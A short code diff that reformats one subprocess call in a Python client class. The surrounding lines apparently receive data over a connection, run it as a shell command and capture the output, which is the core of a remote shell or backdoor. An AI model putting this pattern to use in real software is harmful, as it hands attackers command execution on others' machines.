@@ -88,8 +88,9 @@ class Client(object):
                 break
             elif len(data) > 0:
                 try:
-                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    cmd = subprocess.Popen(data[:].decode("utf-8"), \
+                          shell=True, stdout=subprocess.PIPE, \
+                          stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     output_bytes = cmd.stdout.read() + cmd.stderr.read()
                     output_str = output_bytes.decode("utf-8", errors="replace")
                 except Exception as e:
